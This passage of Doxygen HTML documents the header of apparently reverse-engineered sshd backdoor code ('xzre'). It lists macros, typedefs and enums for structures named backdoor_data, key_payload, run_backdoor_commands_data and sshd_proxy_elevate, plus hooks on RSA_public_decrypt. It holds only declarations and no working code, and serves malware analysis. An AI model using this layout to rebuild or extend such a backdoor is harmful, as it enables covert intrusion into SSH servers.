<tr class="memitem:a95be59797ad9bdcb866b8e123dd2a6b7"><td class="memItemLeft" align="right" valign="top"><a id="a95be59797ad9bdcb866b8e123dd2a6b7"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PERMIT_NO_PASSWD</b>&#160;&#160;&#160;2</td></tr>
<tr class="separator:a95be59797ad9bdcb866b8e123dd2a6b7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acf693c060efdbc236980c16c4a7c351a"><td class="memItemLeft" align="right" valign="top"><a id="acf693c060efdbc236980c16c4a7c351a"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PERMIT_YES</b>&#160;&#160;&#160;3</td></tr>
<tr class="separator:acf693c060efdbc236980c16c4a7c351a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a09db9213e4c2297bab479e6ac1cab9a0"><td class="memItemLeft" align="right" valign="top"><a id="a09db9213e4c2297bab479e6ac1cab9a0"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>TEST_FLAG</b>(x,  flag)&#160;&#160;&#160;(((x) &amp; (flag)) != 0)</td></tr>
<tr class="separator:a09db9213e4c2297bab479e6ac1cab9a0"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="typedef-members"></a>
Typedefs</h2></td></tr>
<tr class="memitem:a92c50087ca0e64fa93fc59402c55f8ca"><td class="memItemLeft" align="right" valign="top"><a id="a92c50087ca0e64fa93fc59402c55f8ca"></a>
typedef uint8_t&#160;</td><td class="memItemRight" valign="bottom"><b>u8</b></td></tr>
<tr class="separator:a92c50087ca0e64fa93fc59402c55f8ca"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace9d960e74685e2cd84b36132dbbf8aa"><td class="memItemLeft" align="right" valign="top"><a id="ace9d960e74685e2cd84b36132dbbf8aa"></a>
typedef uint16_t&#160;</td><td class="memItemRight" valign="bottom"><b>u16</b></td></tr>
<tr class="separator:ace9d960e74685e2cd84b36132dbbf8aa"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afaa62991928fb9fb18ff0db62a040aba"><td class="memItemLeft" align="right" valign="top"><a id="afaa62991928fb9fb18ff0db62a040aba"></a>
typedef uint32_t&#160;</td><td class="memItemRight" valign="bottom"><b>u32</b></td></tr>
<tr class="separator:afaa62991928fb9fb18ff0db62a040aba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3f7e2bcbb0b4c338f3c4f6c937cd4234"><td class="memItemLeft" align="right" valign="top"><a id="a3f7e2bcbb0b4c338f3c4f6c937cd4234"></a>
typedef uint64_t&#160;</td><td class="memItemRight" valign="bottom"><b>u64</b></td></tr>
<tr class="separator:a3f7e2bcbb0b4c338f3c4f6c937cd4234"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a93a1409151dffdb2c15147214279817a"><td class="memItemLeft" align="right" valign="top"><a id="a93a1409151dffdb2c15147214279817a"></a>
typedef uintptr_t&#160;</td><td class="memItemRight" valign="bottom"><b>uptr</b></td></tr>
<tr class="separator:a93a1409151dffdb2c15147214279817a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a74c374136cf9a969dde2585536c808ac"><td class="memItemLeft" align="right" valign="top"><a id="a74c374136cf9a969dde2585536c808ac"></a>
typedef Elf64_Xword&#160;</td><td class="memItemRight" valign="bottom"><b>Elf64_Relr</b></td></tr>
<tr class="separator:a74c374136cf9a969dde2585536c808ac"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a664c87ad0ff2d94f4894df6aae5d491a"><td class="memItemLeft" align="right" valign="top"><a id="a664c87ad0ff2d94f4894df6aae5d491a"></a>
typedef struct link_map *&#160;</td><td class="memItemRight" valign="bottom"><b>lookup_t</b></td></tr>
<tr class="separator:a664c87ad0ff2d94f4894df6aae5d491a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a14e14daa7c876bbbe0dc552f840494f8"><td class="memItemLeft" align="right" valign="top">typedef struct <a class="el" href="structgnu__hash__table.html">gnu_hash_table</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a14e14daa7c876bbbe0dc552f840494f8">gnu_hash_table_t</a></td></tr>
<tr class="separator:a14e14daa7c876bbbe0dc552f840494f8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a050c65e107f0c828f856a231f4b4e788"><td class="memItemLeft" align="right" valign="top"><a id="a050c65e107f0c828f856a231f4b4e788"></a>
typedef int&#160;</td><td class="memItemRight" valign="bottom"><b>BOOL</b></td></tr>
<tr class="separator:a050c65e107f0c828f856a231f4b4e788"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af94dd5658d3041ea81684f2ed45ac9ba"><td class="memItemLeft" align="right" valign="top"><a id="af94dd5658d3041ea81684f2ed45ac9ba"></a>
typedef struct <a class="el" href="structgot__ctx.html">got_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>got_ctx_t</b></td></tr>
<tr class="separator:af94dd5658d3041ea81684f2ed45ac9ba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a73f7e784872b0e3c60100a8f231b0636"><td class="memItemLeft" align="right" valign="top"><a id="a73f7e784872b0e3c60100a8f231b0636"></a>
typedef struct <a class="el" href="structelf__entry__ctx.html">elf_entry_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>elf_entry_ctx_t</b></td></tr>
<tr class="separator:a73f7e784872b0e3c60100a8f231b0636"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aad5c5afe5d33be79e6466010cdba5c78"><td class="memItemLeft" align="right" valign="top"><a id="aad5c5afe5d33be79e6466010cdba5c78"></a>
typedef struct <a class="el" href="structdasm__ctx.html">dasm_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>dasm_ctx_t</b></td></tr>
<tr class="separator:aad5c5afe5d33be79e6466010cdba5c78"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a958fbc6aa42d63f2a2fd296bf0e586e4"><td class="memItemLeft" align="right" valign="top"><a id="a958fbc6aa42d63f2a2fd296bf0e586e4"></a>
typedef struct <a class="el" href="structelf__info.html">elf_info</a>&#160;</td><td class="memItemRight" valign="bottom"><b>elf_info_t</b></td></tr>
<tr class="separator:a958fbc6aa42d63f2a2fd296bf0e586e4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa318f8aef631765be09c477436487c54"><td class="memItemLeft" align="right" valign="top"><a id="aa318f8aef631765be09c477436487c54"></a>
typedef struct <a class="el" href="structlibc__imports.html">libc_imports</a>&#160;</td><td class="memItemRight" valign="bottom"><b>libc_imports_t</b></td></tr>
<tr class="separator:aa318f8aef631765be09c477436487c54"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adecb5c6743212f467a1dcb1137b9a068"><td class="memItemLeft" align="right" valign="top"><a id="adecb5c6743212f467a1dcb1137b9a068"></a>
typedef int(*&#160;</td><td class="memItemRight" valign="bottom"><b>pfn_RSA_public_decrypt_t</b>) (int flen, unsigned char *from, unsigned char *to, RSA *rsa, int padding)</td></tr>
<tr class="separator:adecb5c6743212f467a1dcb1137b9a068"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9942af087add10a0724704291e65c8f0"><td class="memItemLeft" align="right" valign="top"><a id="a9942af087add10a0724704291e65c8f0"></a>
typedef int(*&#160;</td><td class="memItemRight" valign="bottom"><b>pfn_EVP_PKEY_set1_RSA_t</b>) (EVP_PKEY *pkey, struct rsa_st *key)</td></tr>
<tr class="separator:a9942af087add10a0724704291e65c8f0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5e48c0241cc79ff63678f8ea3245e89b"><td class="memItemLeft" align="right" valign="top"><a id="a5e48c0241cc79ff63678f8ea3245e89b"></a>
typedef void(*&#160;</td><td class="memItemRight" valign="bottom"><b>pfn_RSA_get0_key_t</b>) (const RSA *r, const BIGNUM **n, const BIGNUM **e, const BIGNUM **d)</td></tr>
<tr class="separator:a5e48c0241cc79ff63678f8ea3245e89b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ff2f73b261edf1b4c22574b8bc6622e"><td class="memItemLeft" align="right" valign="top"><a id="a6ff2f73b261edf1b4c22574b8bc6622e"></a>
typedef struct <a class="el" href="structimported__funcs.html">imported_funcs</a>&#160;</td><td class="memItemRight" valign="bottom"><b>imported_funcs_t</b></td></tr>
<tr class="separator:a6ff2f73b261edf1b4c22574b8bc6622e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a88322b8c78181f22ffedac582914ff71"><td class="memItemLeft" align="right" valign="top"><a id="a88322b8c78181f22ffedac582914ff71"></a>
typedef int(*&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_monitor_func_t</b>) (struct ssh *ssh, int sock, struct sshbuf *m)</td></tr>
<tr class="separator:a88322b8c78181f22ffedac582914ff71"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9daa34d6565ffe5f55796b4725f934c9"><td class="memItemLeft" align="right" valign="top"><a id="a9daa34d6565ffe5f55796b4725f934c9"></a>
typedef struct <a class="el" href="structsshd__ctx.html">sshd_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_ctx_t</b></td></tr>
<tr class="separator:a9daa34d6565ffe5f55796b4725f934c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a124787f6a02a94208dafa5994d89644d"><td class="memItemLeft" align="right" valign="top"><a id="a124787f6a02a94208dafa5994d89644d"></a>
typedef void(*&#160;</td><td class="memItemRight" valign="bottom"><b>log_handler_fn</b>) (LogLevel level, int forced, const char *msg, void *ctx)</td></tr>
<tr class="separator:a124787f6a02a94208dafa5994d89644d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6f86f3a8bd5ba030a9f53f298b22ef00"><td class="memItemLeft" align="right" valign="top"><a id="a6f86f3a8bd5ba030a9f53f298b22ef00"></a>
typedef struct <a class="el" href="structsshd__log__ctx.html">sshd_log_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_log_ctx_t</b></td></tr>
<tr class="separator:a6f86f3a8bd5ba030a9f53f298b22ef00"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac4fe3cc13a3ff4b5b495d34f1772c6df"><td class="memItemLeft" align="right" valign="top"><a id="ac4fe3cc13a3ff4b5b495d34f1772c6df"></a>
typedef union <a class="el" href="unionsshd__offsets__kex.html">sshd_offsets_kex</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_offsets_kex_t</b></td></tr>
<tr class="separator:ac4fe3cc13a3ff4b5b495d34f1772c6df"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad83d376950ce717489769415c25a5302"><td class="memItemLeft" align="right" valign="top"><a id="ad83d376950ce717489769415c25a5302"></a>
typedef union <a class="el" href="unionsshd__offsets__sshbuf.html">sshd_offsets_sshbuf</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_offsets_sshbuf_t</b></td></tr>
<tr class="separator:ad83d376950ce717489769415c25a5302"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2a6e9d6a0969316000596ae0a8efb7cb"><td class="memItemLeft" align="right" valign="top"><a id="a2a6e9d6a0969316000596ae0a8efb7cb"></a>
typedef struct <a class="el" href="structsshd__offsets__fields.html">sshd_offsets_fields</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_offsets_fields_t</b></td></tr>
<tr class="separator:a2a6e9d6a0969316000596ae0a8efb7cb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7be4624c05a2d9dcfae7da34acdaa69c"><td class="memItemLeft" align="right" valign="top"><a id="a7be4624c05a2d9dcfae7da34acdaa69c"></a>
typedef struct <a class="el" href="structsshd__offsets.html">sshd_offsets</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_offsets_t</b></td></tr>
<tr class="separator:a7be4624c05a2d9dcfae7da34acdaa69c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab68f29e0abdd79f51343bc4c1b381b8e"><td class="memItemLeft" align="right" valign="top"><a id="ab68f29e0abdd79f51343bc4c1b381b8e"></a>
typedef struct <a class="el" href="structsshd__payload__ctx.html">sshd_payload_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_payload_ctx_t</b></td></tr>
<tr class="separator:ab68f29e0abdd79f51343bc4c1b381b8e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2390d675ac7d2f897005a15e2564c755"><td class="memItemLeft" align="right" valign="top"><a id="a2390d675ac7d2f897005a15e2564c755"></a>
typedef struct <a class="el" href="structglobal__context.html">global_context</a>&#160;</td><td class="memItemRight" valign="bottom"><b>global_context_t</b></td></tr>
<tr class="separator:a2390d675ac7d2f897005a15e2564c755"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6c5124b08f8bc7830d5b4d737fbd605e"><td class="memItemLeft" align="right" valign="top"><a id="a6c5124b08f8bc7830d5b4d737fbd605e"></a>
typedef struct <a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_shared_globals_t</b></td></tr>
<tr class="separator:a6c5124b08f8bc7830d5b4d737fbd605e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af35dcaf62ea5454989cdb109286a4afa"><td class="memItemLeft" align="right" valign="top"><a id="af35dcaf62ea5454989cdb109286a4afa"></a>
typedef struct <a class="el" href="structldso__ctx.html">ldso_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>ldso_ctx_t</b></td></tr>
<tr class="separator:af35dcaf62ea5454989cdb109286a4afa"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6bdb9d6365136f6f9cefd4ba841ae308"><td class="memItemLeft" align="right" valign="top"><a id="a6bdb9d6365136f6f9cefd4ba841ae308"></a>
typedef struct <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_hooks_data_t</b></td></tr>
<tr class="separator:a6bdb9d6365136f6f9cefd4ba841ae308"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6f9a74cf91da7432a6404333a7658fbf"><td class="memItemLeft" align="right" valign="top"><a id="a6f9a74cf91da7432a6404333a7658fbf"></a>
typedef struct <a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_hooks_ctx_t</b></td></tr>
<tr class="separator:a6f9a74cf91da7432a6404333a7658fbf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae0c3110b1c8c437dac9dbe0220812d76"><td class="memItemLeft" align="right" valign="top"><a id="ae0c3110b1c8c437dac9dbe0220812d76"></a>
typedef struct <a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_setup_params_t</b></td></tr>
<tr class="separator:ae0c3110b1c8c437dac9dbe0220812d76"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a65ea88969746c06d6c0d0b1586f610db"><td class="memItemLeft" align="right" valign="top">typedef struct <a class="el" href="structelf__handles.html">elf_handles</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a></td></tr>
<tr class="memdesc:a65ea88969746c06d6c0d0b1586f610db"><td class="mdescLeft">&#160;</td><td class="mdescRight">array of ELF handles  <a href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">More...</a><br /></td></tr>
<tr class="separator:a65ea88969746c06d6c0d0b1586f610db"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af0352a4d23a7e16b20f79506c137e2e1"><td class="memItemLeft" align="right" valign="top"><a id="af0352a4d23a7e16b20f79506c137e2e1"></a>
typedef struct <a class="el" href="structmain__elf.html">main_elf</a>&#160;</td><td class="memItemRight" valign="bottom"><b>main_elf_t</b></td></tr>
<tr class="separator:af0352a4d23a7e16b20f79506c137e2e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a78a513f8570845832aaf68c928a5126a"><td class="memItemLeft" align="right" valign="top"><a id="a78a513f8570845832aaf68c928a5126a"></a>
typedef struct <a class="el" href="structbackdoor__data.html">backdoor_data</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a></td></tr>
<tr class="memdesc:a78a513f8570845832aaf68c928a5126a"><td class="mdescLeft">&#160;</td><td class="mdescRight">this structure is used to hold most of the backdoor information. it's used as a local variable in function <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a> <br /></td></tr>
<tr class="separator:a78a513f8570845832aaf68c928a5126a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a98d97fcc51fcd4fdbc88e9cd1f0d4405"><td class="memItemLeft" align="right" valign="top"><a id="a98d97fcc51fcd4fdbc88e9cd1f0d4405"></a>
typedef struct <a class="el" href="structbackdoor__data__handle.html">backdoor_data_handle</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a></td></tr>
<tr class="memdesc:a98d97fcc51fcd4fdbc88e9cd1f0d4405"><td class="mdescLeft">&#160;</td><td class="mdescRight">data passed to functions that access the backdoor data <br /></td></tr>
<tr class="separator:a98d97fcc51fcd4fdbc88e9cd1f0d4405"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a130c3466679311acb5163d49a2ea048b"><td class="memItemLeft" align="right" valign="top"><a id="a130c3466679311acb5163d49a2ea048b"></a>
typedef struct <a class="el" href="structstring__item.html">string_item</a>&#160;</td><td class="memItemRight" valign="bottom"><b>string_item_t</b></td></tr>
<tr class="separator:a130c3466679311acb5163d49a2ea048b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a25049b8d6b9ec64043d555466a1ba0c8"><td class="memItemLeft" align="right" valign="top"><a id="a25049b8d6b9ec64043d555466a1ba0c8"></a>
typedef struct <a class="el" href="structstring__references.html">string_references</a>&#160;</td><td class="memItemRight" valign="bottom"><b>string_references_t</b></td></tr>
<tr class="separator:a25049b8d6b9ec64043d555466a1ba0c8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac09fbbea7d8206283c4c0eae09beec95"><td class="memItemLeft" align="right" valign="top"><a id="ac09fbbea7d8206283c4c0eae09beec95"></a>
typedef struct <a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_shared_libraries_data_t</b></td></tr>
<tr class="separator:ac09fbbea7d8206283c4c0eae09beec95"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a34086a072591337b5f57eff2e26315e4"><td class="memItemLeft" align="right" valign="top"><a id="a34086a072591337b5f57eff2e26315e4"></a>
typedef struct <a class="el" href="structsecret__data__item.html">secret_data_item</a>&#160;</td><td class="memItemRight" valign="bottom"><b>secret_data_item_t</b></td></tr>
<tr class="separator:a34086a072591337b5f57eff2e26315e4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a41b1410a6c3d2613895ce26896903600"><td class="memItemLeft" align="right" valign="top">typedef struct <a class="el" href="structkey__payload__hdr.html">key_payload_hdr</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a41b1410a6c3d2613895ce26896903600">key_payload_hdr_t</a></td></tr>
<tr class="memdesc:a41b1410a6c3d2613895ce26896903600"><td class="mdescLeft">&#160;</td><td class="mdescRight">the payload header. also used as Chacha IV  <a href="xzre_8h.html#a41b1410a6c3d2613895ce26896903600">More...</a><br /></td></tr>
<tr class="separator:a41b1410a6c3d2613895ce26896903600"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acaf6872f6ef6b8ee82f23eed7848342f"><td class="memItemLeft" align="right" valign="top"><a id="acaf6872f6ef6b8ee82f23eed7848342f"></a>
typedef struct <a class="el" href="structcmd__arguments.html">cmd_arguments</a>&#160;</td><td class="memItemRight" valign="bottom"><b>cmd_arguments_t</b></td></tr>
<tr class="separator:acaf6872f6ef6b8ee82f23eed7848342f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa67ed5b791086acc0829e228ff50d9d8"><td class="memItemLeft" align="right" valign="top"><a id="aa67ed5b791086acc0829e228ff50d9d8"></a>
typedef struct <a class="el" href="structkey__payload__body.html">key_payload_body</a>&#160;</td><td class="memItemRight" valign="bottom"><b>key_payload_body_t</b></td></tr>
<tr class="separator:aa67ed5b791086acc0829e228ff50d9d8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaad9381e8f52552bbb914465c45bdac2"><td class="memItemLeft" align="right" valign="top">typedef struct <a class="el" href="structkey__payload.html">key_payload</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aaad9381e8f52552bbb914465c45bdac2">key_payload_t</a></td></tr>
<tr class="memdesc:aaad9381e8f52552bbb914465c45bdac2"><td class="mdescLeft">&#160;</td><td class="mdescRight">the contents of the RSA 'n' field  <a href="xzre_8h.html#aaad9381e8f52552bbb914465c45bdac2">More...</a><br /></td></tr>
<tr class="separator:aaad9381e8f52552bbb914465c45bdac2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a25dd255ba67cef416ef3ef7adeb479ae"><td class="memItemLeft" align="right" valign="top"><a id="a25dd255ba67cef416ef3ef7adeb479ae"></a>
typedef struct <a class="el" href="structkey__ctx.html">key_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>key_ctx_t</b></td></tr>
<tr class="separator:a25dd255ba67cef416ef3ef7adeb479ae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac0c8a0430fa3d00804d08b800bfdfc5d"><td class="memItemLeft" align="right" valign="top"><a id="ac0c8a0430fa3d00804d08b800bfdfc5d"></a>
typedef struct <a class="el" href="structmonitor__data.html">monitor_data</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a></td></tr>
<tr class="memdesc:ac0c8a0430fa3d00804d08b800bfdfc5d"><td class="mdescLeft">&#160;</td><td class="mdescRight">data used within <a class="el" href="xzre_8h.html#a60b93ed64ba904012e9fa9477e97a244">sshd_proxy_elevate</a> <br /></td></tr>
<tr class="separator:ac0c8a0430fa3d00804d08b800bfdfc5d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9ba16eb5c7f3a17e2b27a735fa9ea758"><td class="memItemLeft" align="right" valign="top"><a id="a9ba16eb5c7f3a17e2b27a735fa9ea758"></a>
typedef union <a class="el" href="unionbackdoor__runtime__data.html">backdoor_runtime_data</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a9ba16eb5c7f3a17e2b27a735fa9ea758">backdoor_runtime_data_t</a></td></tr>
<tr class="memdesc:a9ba16eb5c7f3a17e2b27a735fa9ea758"><td class="mdescLeft">&#160;</td><td class="mdescRight">union used within <a class="el" href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">run_backdoor_commands</a> <br /></td></tr>
<tr class="separator:a9ba16eb5c7f3a17e2b27a735fa9ea758"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa5a220a495d161205ee770f8e7b360d5"><td class="memItemLeft" align="right" valign="top"><a id="aa5a220a495d161205ee770f8e7b360d5"></a>
typedef struct <a class="el" href="structrun__backdoor__commands__data.html">run_backdoor_commands_data</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a></td></tr>
<tr class="memdesc:aa5a220a495d161205ee770f8e7b360d5"><td class="mdescLeft">&#160;</td><td class="mdescRight">stack frame layout for <a class="el" href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">run_backdoor_commands</a> <br /></td></tr>
<tr class="separator:aa5a220a495d161205ee770f8e7b360d5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa3a6684a5fb42dd8a40723dbfde905c7"><td class="memItemLeft" align="right" valign="top"><a id="aa3a6684a5fb42dd8a40723dbfde905c7"></a>
typedef struct <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_cpuid_reloc_consts_t</b></td></tr>
<tr class="separator:aa3a6684a5fb42dd8a40723dbfde905c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a216c3961f10b457c305611c618495ae1"><td class="memItemLeft" align="right" valign="top"><a id="a216c3961f10b457c305611c618495ae1"></a>
typedef struct <a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_tls_get_addr_reloc_consts_t</b></td></tr>
<tr class="separator:a216c3961f10b457c305611c618495ae1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5219a4fe1340ccc6da977feea7154e58"><td class="memItemLeft" align="right" valign="top"><a id="a5219a4fe1340ccc6da977feea7154e58"></a>
typedef struct <a class="el" href="structelf__functions.html">elf_functions</a>&#160;</td><td class="memItemRight" valign="bottom"><b>elf_functions_t</b></td></tr>
<tr class="separator:a5219a4fe1340ccc6da977feea7154e58"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab650ac6c7c050d5b9430dd68b4f4fef8"><td class="memItemLeft" align="right" valign="top"><a id="ab650ac6c7c050d5b9430dd68b4f4fef8"></a>
typedef struct <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a>&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma_allocator_t</b></td></tr>
<tr class="separator:ab650ac6c7c050d5b9430dd68b4f4fef8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aab16a9d096477545284f14539e84c7bc"><td class="memItemLeft" align="right" valign="top"><a id="aab16a9d096477545284f14539e84c7bc"></a>
typedef struct <a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>instruction_search_ctx_t</b></td></tr>
<tr class="separator:aab16a9d096477545284f14539e84c7bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5388ad27423cd366d74dd8a1cec2d433"><td class="memItemLeft" align="right" valign="top"><a id="a5388ad27423cd366d74dd8a1cec2d433"></a>
typedef struct <a class="el" href="structdl__tls__index.html">dl_tls_index</a>&#160;</td><td class="memItemRight" valign="bottom"><b>tls_index</b></td></tr>
<tr class="separator:a5388ad27423cd366d74dd8a1cec2d433"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="enum-members"></a>
Enumerations</h2></td></tr>
<tr class="memitem:a7a28d9f889f70e46106eb6e946183605"><td class="memItemLeft" align="right" valign="top"><a id="a7a28d9f889f70e46106eb6e946183605"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>InstructionFlags</b> { <br />
&#160;&#160;<b>DF_LOCK_REP</b> = 1
, <b>DF_SEG</b> = 2
, <b>DF_OSIZE</b> = 4
, <b>DF_ASIZE</b> = 8
, <br />
&#160;&#160;<b>DF_VEX</b> = 0x10
, <b>DF_REX</b> = 0x20
, <b>DF_MODRM</b> = 0x40
, <b>DF_SIB</b> = 0x80
<br />
 }</td></tr>
<tr class="separator:a7a28d9f889f70e46106eb6e946183605"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a601dc05cbcee627f9a0439b294b3e11f"><td class="memItemLeft" align="right" valign="top"><a id="a601dc05cbcee627f9a0439b294b3e11f"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>InstructionFlags2</b> { <br />
&#160;&#160;<b>DF_MEM_DISP</b> = 0x1
, <b>DF_MEM_DISP8</b> = 0x2
, <b>DF_MEM_SEG_OFFS</b> = 0x4
, <b>DF_IMM</b> = 0x8
, <br />
&#160;&#160;<b>DF_IMM64</b> = 0x10
<br />
 }</td></tr>
<tr class="separator:a601dc05cbcee627f9a0439b294b3e11f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8720669b781fc318e97d4ec37ae4997c"><td class="memItemLeft" align="right" valign="top"><a id="a8720669b781fc318e97d4ec37ae4997c"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>ElfFlags</b> { <br />
&#160;&#160;<b>X_ELF_PLTREL</b> = 0x1
, <b>X_ELF_RELA</b> = 0x2
, <b>X_ELF_RELR</b> = 0x4
, <b>X_ELF_VERDEF</b> = 0x8
, <br />
&#160;&#160;<b>X_ELF_VERSYM</b> = 0x10
, <b>X_ELF_NOW</b> = 0x20
<br />
 }</td></tr>
<tr class="separator:a8720669b781fc318e97d4ec37ae4997c"><td class="memSeparator" colspan="2">&#160;</td></tr>
